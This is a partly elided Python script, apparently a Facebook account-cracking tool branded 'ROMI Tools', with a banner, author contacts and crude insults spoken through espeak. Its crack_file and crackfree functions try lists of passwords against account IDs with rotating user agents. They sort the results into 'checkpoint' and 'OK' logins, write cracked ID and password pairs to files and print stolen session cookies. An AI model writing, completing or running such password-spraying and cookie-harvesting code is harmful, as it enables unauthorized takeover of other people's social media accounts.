...
def contact():
    ...
    # os.system("xdg-open https://www.facebook.com/61550816220930")
    back()
...
os.system('espeak -a 300 " Welcome,   to,  ROMI ,    Tools  , LUND , KHA , ROMI , KA , LORA "')
pass
 ...
 @@@@@@                                 @@@@@@
  @@@@@           88888888888           @@@@@
    @@@@        888888888888888        @@@@
     ...
     @@ @@@       ROMI        @@@ @@
\33[1;91m╔════════════════════════════════════════╗
\33[1;92m║[•] Author    : MR ROMI KING            ║
\33[1;92m║[•] Facebook  : 國༒ ROMI メ　鏝࿐ (ROMI) ║
\33[1;92m║[•] Whatsapp  : +92636727189            ║
\33[1;92m║[•] Github    : TERI MA KA YR          ║
...
def crack_file():
    ...
    print('\033[1;32m[ Put File Example:  /sdcard/ROMI .txt  Etc...]')
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;93m[ROMI VAI-Cp] {idf} • {pw}')
                ...
                print(f'\r\033[0;92m[ROMI VAI-Ok🔥] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
...
def crackfree(idf, pwv):
    global loop, ok, cp
    sys.stdout.write(
        f"\r{H}[ROMI VAI-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop / float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;93m[{time.strftime("%H:%M")}•ROMI VAI-Cp] {idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/' + cpc, 'a').write(idf + ' • ' + pw + '\n')
                akun.append(idf + ' • ' + pw)
                cp += 1
                ...
                coki = po.cookies.get_dict()
                kuki = (";").join(["%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items()])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•ROMI VAI-Ok] {idf} • {pw} ')
